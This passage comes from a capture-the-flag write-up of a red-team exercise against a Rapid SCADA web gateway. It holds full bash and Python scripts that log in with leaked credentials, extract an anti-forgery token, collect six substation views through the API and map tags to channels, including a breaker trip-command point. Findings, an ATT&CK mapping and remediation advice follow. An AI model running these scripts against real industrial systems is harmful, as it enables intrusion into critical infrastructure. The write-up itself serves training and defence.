**Figure 9.** *The North Protection IED view exposed the feeder trip-command point as channel 1107 with tag N1_TC.*

## 4.10 Step 10 - North Transformer Monitoring Analysis

|                 |                                                    |
|-----------------|----------------------------------------------------|
| **Objective**   | Inspect View 13 for winding-temperature telemetry. |
| **Observation** | N1_TW correlated with channel 1112.                |
| **Result**      | The fourth mapping element was identified.         |

**Original transformer monitoring analysis script**

> cat \> /tmp/rapid-step10.sh \<\<'BASH'\
> \#!/usr/bin/env bash\
> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\${TARGET}"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> COOKIE_JAR="\${RED_DIR}/session.cookie"\
> \
> VIEW_ID="13"\
> TABLE_FILE="\${RED_DIR}/table-view-\${VIEW_ID}.html"\
> API_FILE="\${RED_DIR}/current-data-\${VIEW_ID}.json"\
> \
> clear\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 10: TRANSFORMER MONITORING ANALYSIS"\
> echo " View ID: 13 - North Transformer Monitoring"\
> echo "============================================================"\
> echo\
> \
> test -s "\$COOKIE_JAR" \|\| {\
> echo "SESSION_COOKIE:FAIL"\
> exit 1\
> }\
> \
> TABLE_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\$TABLE_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Main/TableView/\$VIEW_ID"\
> )"\
> \
> echo "TABLE_VIEW_HTTP=\$TABLE_HTTP"\
> test "\$TABLE_HTTP" = "200"\
> \
> CNL_LIST_ID="\$(\
> python3 - "\$TABLE_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> text = Path(sys.argv\[1\]).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> \
> patterns = (\
> r'cnlListID\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'cnlListId\["\\\]?\s\*\[:=\]\s\*\["\\\]?(-?\d+)',\
> r'\[?&\]cnlListID=(-?\d+)',\
> )\
> \
> for pattern in patterns:\
> match = re.search(pattern, text, re.I)\
> \
> if match:\
> print(match.group(1))\
> raise SystemExit(0)\
> \
> print("0")\
> PY\
> )"\
> \
> echo "CHANNEL_LIST_ID=\$CNL_LIST_ID"\
> \
> API_HTTP="\$(\
> curl -sS -L \\\
> -A "RapidSCADA-Red-Manual/1.0" \\\
> -b "\$COOKIE_JAR" \\\
> -H 'Accept: application/json, text/plain, \*/\*' \\\
> -o "\$API_FILE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Api/Main/GetCurDataByView?viewID=\$VIEW_ID&cnlListID=\$CNL_LIST_ID&appendUnit=true"\
> )"\
> \
> echo "CURRENT_DATA_HTTP=\$API_HTTP"\
> \
> test "\$API_HTTP" = "200"\
> test -s "\$TABLE_FILE"\
> test -s "\$API_FILE"\
> \
> python3 - "\$TABLE_FILE" "\$API_FILE" \<\<'PY'\
> import re\
> import sys\
> from pathlib import Path\
> \
> combined = "\n".join(\
> Path(path).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> for path in sys.argv\[1:\]\
> )\
> \
> tag = "N1_TW"\
> channel = "1112"\
> \
> tag_match = re.search(re.escape(tag), combined)\
> \
> if not tag_match:\
> raise SystemExit(f"TAG_NOT_FOUND:{tag}")\
> \
> start = max(0, tag_match.start() - 1500)\
> end = min(len(combined), tag_match.end() + 1500)\
> window = combined\[start:end\]\
> \
> if not re.search(\
> rf"(?\<!\d){re.escape(channel)}(?!\d)",\
> window,\
> ):\
> raise SystemExit(\
> f"CHANNEL_CORRELATION_FAILED:{channel}:{tag}"\
> )\
> \
> print()\
> print("===== DISCOVERED TRANSFORMER POINT =====")\
> print()\
> print("North transformer winding temperature")\
> print(f" CHANNEL={channel}")\
> print(f" TAG={tag}")\
> print()\
> print("RAPID_SCADA_TRANSFORMER_ANALYSIS:PASS")\
> PY\
> BASH\
> \
> chmod +x /tmp/rapid-step10.sh\
> /tmp/rapid-step10.sh

View 13 contained N1_TW and channel 1112 in the same evidence region, satisfying the scripted correlation test.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image1.png" style="width:6.9in;height:2.35267in" alt="The North Transformer Monitoring view exposed the winding-temperature point as channel 1112 with tag N1_TW." />

**Figure 10.** *The North Transformer Monitoring view exposed the winding-temperature point as channel 1112 with tag N1_TW.*

## 4.11 Step 11 - Cross-Substation Collection and Final Mapping

|  |  |
|----|----|
| **Objective** | Generate one coherent login and browsing sequence across all sensitive views. |
| **Observation** | Views 11, 12, 13, 21, 22, and 23 returned HTTP 200 for both table and API requests. |
| **Result** | The final mapping was reconstructed as 1101/1104/1107/1112. |

A fresh correlated session used RapidSCADA-Red-Manual/1.0 consistently. The script collected all six sensitive table views and GetCurDataByView responses, producing a single activity sequence suitable for Red evidence and defensive correlation.

**Original cross-substation collection script**

> cat \> /tmp/rapid-step11.sh \<\<'BASH'\
> \#!/usr/bin/env bash\
> set -Eeuo pipefail\
> \
> TARGET="168.144.89.147"\
> BASE_URL="http://\${TARGET}"\
> USER_AGENT="RapidSCADA-Red-Manual/1.0"\
> RED_DIR="/home/kali/Documents/rapid-scada-red-manual"\
> COOKIE_JAR="\${RED_DIR}/correlated-session.cookie"\
> LOGIN_PAGE="\${RED_DIR}/correlated-login.html"\
> \
> mkdir -p "\$RED_DIR"\
> rm -f "\$COOKIE_JAR" "\$LOGIN_PAGE"\
> \
> clear\
> \
> echo "============================================================"\
> echo " RED TEAM WRITEUP - STEP 11: CROSS-SUBSTATION COLLECTION"\
> echo " Target: \${BASE_URL}"\
> echo " Account: fieldtech"\
> echo "============================================================"\
> echo\
> \
> LOGIN_PAGE_HTTP="\$(\
> curl -sS \\\
> -A "\$USER_AGENT" \\\
> -c "\$COOKIE_JAR" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\$LOGIN_PAGE" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Login"\
> )"\
> \
> echo "LOGIN_PAGE_HTTP=\$LOGIN_PAGE_HTTP"\
> test "\$LOGIN_PAGE_HTTP" = "200"\
> \
> TOKEN="\$(\
> python3 - "\$LOGIN_PAGE" \<\<'PY'\
> from html.parser import HTMLParser\
> from pathlib import Path\
> import sys\
> \
> class TokenParser(HTMLParser):\
> def \_\_init\_\_(self):\
> super().\_\_init\_\_()\
> self.token = None\
> \
> def handle_starttag(self, tag, attrs):\
> if tag.lower() != "input":\
> return\
> \
> values = dict(attrs)\
> \
> if values.get("name") == "\_\_RequestVerificationToken":\
> self.token = values.get("value", "")\
> \
> parser = TokenParser()\
> parser.feed(\
> Path(sys.argv\[1\]).read_text(\
> encoding="utf-8",\
> errors="ignore",\
> )\
> )\
> \
> if not parser.token:\
> raise SystemExit("ANTIFORGERY_TOKEN_NOT_FOUND")\
> \
> print(parser.token)\
> PY\
> )"\
> \
> echo "ANTIFORGERY_TOKEN:FOUND"\
> \
> LOGIN_HTTP="\$(\
> curl -sS -L \\\
> -A "\$USER_AGENT" \\\
> -c "\$COOKIE_JAR" \\\
> -b "\$COOKIE_JAR" \\\
> -o /dev/null \\\
> -w '%{http_code}' \\\
> --data-urlencode "Username=fieldtech" \\\
> --data-urlencode "Password=fieldtech" \\\
> --data-urlencode "RememberMe=false" \\\
> --data-urlencode "\_\_RequestVerificationToken=\$TOKEN" \\\
> "\$BASE_URL/Login"\
> )"\
> \
> echo "AUTHENTICATED_LOGIN_HTTP=\$LOGIN_HTTP"\
> test "\$LOGIN_HTTP" = "200"\
> \
> echo\
> echo "===== SENSITIVE OPERATIONAL VIEW COLLECTION ====="\
> \
> for VIEW_ID in 11 12 13 21 22 23; do\
> TABLE_HTTP="\$(\
> curl -sS \\\
> -A "\$USER_AGENT" \\\
> -b "\$COOKIE_JAR" \\\
> -o "\${RED_DIR}/correlated-view-\${VIEW_ID}.html" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Main/TableView/\$VIEW_ID"\
> )"\
> \
> API_HTTP="\$(\
> curl -sS \\\
> -A "\$USER_AGENT" \\\
> -b "\$COOKIE_JAR" \\\
> -H 'Accept: application/json, text/plain, \*/\*' \\\
> -o "\${RED_DIR}/correlated-data-\${VIEW_ID}.json" \\\
> -w '%{http_code}' \\\
> "\$BASE_URL/Api/Main/GetCurDataByView?viewID=\$VIEW_ID&cnlListID=0&appendUnit=true"\
> )"\
> \
> test "\$TABLE_HTTP" = "200"\
> test "\$API_HTTP" = "200"\
> \
> case "\$VIEW_ID" in\
> 11) VIEW_NAME="North Feeder Panel" ;;\
> 12) VIEW_NAME="North Protection IED" ;;\
> 13) VIEW_NAME="North Transformer Monitoring" ;;\
> 21) VIEW_NAME="South Feeder Panel" ;;\
> 22) VIEW_NAME="South Protection IED" ;;\
> 23) VIEW_NAME="South Transformer Monitoring" ;;\
> esac\
> \
> printf 'VIEW=%s TABLE_HTTP=%s API_HTTP=%s NAME="%s"\n' \\\
> "\$VIEW_ID" \\\
> "\$TABLE_HTTP" \\\
> "\$API_HTTP" \\\
> "\$VIEW_NAME"\
> \
> sleep 1\
> done\
> \
> echo\
> echo "===== RECONSTRUCTED FEEDER MAPPING ====="\
> echo "Active load: 1101 / N1_P"\
> echo "Breaker status: 1104 / N1_BS"\
> echo "Trip command: 1107 / N1_TC"\
> echo "Transformer winding temperature: 1112 / N1_TW"\
> echo\
> echo "FINAL_MAPPING=1101/1104/1107/1112"\
> echo "SENSITIVE_VIEW_SCOPE=6_OF_6"\
> echo "RAPID_SCADA_CROSS_SUBSTATION_COLLECTION:PASS"\
> BASH\
> \
> chmod +x /tmp/rapid-step11.sh\
> /tmp/rapid-step11.sh

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Rapid-SCADA-Feeder-Tag-Mapping/media/image6.png" style="width:6.9in;height:3.86092in" alt="The authenticated field account collected all six sensitive operational views and reconstructed the final feeder mapping as 1101/1104/1107/1112." />

**Figure 11.** *The authenticated field account collected all six sensitive operational views and reconstructed the final feeder mapping as 1101/1104/1107/1112.*

# 5. Consolidated Findings

| **ID** | **Finding** | **Validated evidence** | **Severity** |
|----|----|----|----|
| F-01 | Public path disclosure | robots.txt disclosed /support/ | Medium |
| F-02 | Directory listing enabled | Backup filename exposed without authentication | High |
| F-03 | Credential exposure | Valid fieldtech credentials in public backup | Critical |
| F-04 | Excessive read-only scope | One account accessed both substations | High |
| F-05 | Operational metadata exposure | Tags and channels exposed by views and API | High |
| F-06 | Cleartext web workflow | Credentials and operational data traversed HTTP | High |

## 5.1 Reconstructed Channel Mapping

| **Operational point**                 | **Tag** | **Channel** | **Source view** |
|---------------------------------------|---------|-------------|-----------------|
| North feeder active load              | N1_P    | 1101        | View 11         |
| North feeder breaker status           | N1_BS   | 1104        | View 11         |
| North feeder trip command             | N1_TC   | 1107        | View 12         |
| North transformer winding temperature | N1_TW   | 1112        | View 13         |

|                                           |
|-------------------------------------------|
| **Submission value:** 1101/1104/1107/1112 |

# 6. Security Impact and ATT&CK Mapping

Although fieldtech was read-only, it exposed operational context across two substations: feeder loads, breaker states, trip-command points, transformer telemetry, internal tags, and channel identifiers. Such intelligence can improve targeting, operational modeling, command selection, and evasion in a real industrial environment.

|  |  |
|----|----|
| **ATT&CK for ICS technique** | T0861 - Point & Tag Identification |
| **Observed behavior** | Authenticated browsing followed by current-data API collection |
| **Scope** | North and South substations |
| **Collected identifiers** | View IDs, tag names, channel IDs, and functional classifications |
| **Operational consequence** | Accurate reconstruction of monitored and command-related process points |

# 7. Remediation Recommendations

**Remove exposed backup files.** Delete field-client.ini.bak and all commissioning artifacts from web-accessible locations.

**Disable directory listing.** Set Nginx autoindex off and deny unsupported support paths.

**Rotate compromised credentials.** Rotate fieldtech, invalidate sessions, and use unique managed secrets.

**Enforce HTTPS.** Protect credentials, tokens, cookies, and operational API data in transit.

**Reduce account scope.** Limit each field account to the minimum substation and view set.

**Protect operational APIs.** Apply explicit authorization to every TableView and GetCurDataByView request.

**Detect broad view browsing.** Alert on rapid access to multiple sensitive views or substations from the same account, source, and user agent.

**Harden commissioning handover.** Automatically remove temporary profiles, backups, and support content before acceptance.

# 8. Conclusion

The Rapid SCADA Feeder Tag Mapping challenge was solved manually from an external Kali Linux workstation. No direct access to the underlying SCADA service ports or server shell was required. A web-content exposure chain disclosed valid credentials, and the read-only account exposed operational views and current-data APIs across both substations.

The final channel mapping was validated across separate feeder, protection, and transformer views rather than inferred from one page. The completed collection confirmed all six sensitive views and produced the required value: 1101/1104/1107/1112.

|                                                                        |
|------------------------------------------------------------------------|
| **Final status:** Red Team challenge objective completed successfully. |

# Appendix A - Evidence Index

| **Figure** | **Evidence** | **Source screenshot** |
|----|----|----|
| Figure 1 | External reconnaissance | Figure 1 â€” External reconnaissance identified SSH and the Nginx-hosted Rapid SCADA web gateway on TCP port 80.png |
| Figure 2 | robots.txt path disclosure | Figure 2 â€” The publicly accessible robots-txt file disclosed the hidden-support-directory.png |
| Figure 3 | Support directory enumeration | Figure 3 â€” Directory enumeration revealed an exposed field-client configuration backup within the support path.png |
| Figure 4 | Credential disclosure | Figure 4 â€” An exposed field-client configuration backup disclosed valid read-only Rapid SCADA credentials.png |
| Figure 5 | Login form identification | 05-Rapid SCADA login form was identified.png |
| Figure 6.1 | Authentication workspace | 06-1-The exposed field-client credentials and valid anti-forgery token established an authenticated read-only Rapid SCADA session.png |
| Figure 6.2 | Login page retrieval | 06-2-The exposed field-client credentials and valid anti-forgery token established an authenticated read-only Rapid SCADA session.png |
| Figure 6.3 | Anti-forgery token extraction | 06-3-The exposed field-client credentials and valid anti-forgery token established an authenticated read-only Rapid SCADA session.png |
| Figure 6.4 | Credential POST | 06-4-The exposed field-client credentials and valid anti-forgery token established an authenticated read-only Rapid SCADA session.png |
| Figure 6.5 | Authenticated view | 06-5-The exposed field-client credentials and valid anti-forgery token established an authenticated read-only Rapid SCADA session.png |
| Figure 7 | View enumeration | 07-Figure 7 â€” The authenticated read-only session exposed eight operational views spanning the North and South substations, including feeder, protection and transformer monitoring interfaces.png |
| Figure 8.1 | North feeder HTTP/API response | 08-1-Figure 8 â€” Analysis of the North Feeder Panel correlated the active-load, breaker-status and trip-command tags with channels 1101, 1104 and 1107.png |
| Figure 8.2 | North feeder point correlation | 08-2.png, cropped only below the validated mappings |
| Figure 9 | Protection IED correlation | 09-Figure 9 â€” The North Protection IED view exposed the feeder trip-command point as channel 1107 with tag N1_TC..png |
| Figure 10 | Transformer correlation | 10-Figure 10 â€” The North Transformer Monitoring view exposed the winding-temperature point as channel 1112 with tag N1_TW.png |
| Figure 11 | Cross-substation mapping | 11-Figure 11 â€” The authenticated field account collected all six sensitive operational views across both substations and reconstructed the final feeder mapping as-1101-1104-1107-1112.png |

# Appendix B - Validation Summary

| **Validation activity**              | **Result**          |
|--------------------------------------|---------------------|
| External reconnaissance              | **PASS**            |
| Hidden path discovery                | **PASS**            |
| Credential extraction                | **PASS**            |
| Authentication                       | **PASS**            |
| View enumeration                     | **PASS**            |
| North feeder correlation             | **PASS**            |
| Protection IED correlation           | **PASS**            |
| Transformer correlation              | **PASS**            |
| Six-view cross-substation collection | **PASS**            |
| Final mapping                        | 1101/1104/1107/1112 |

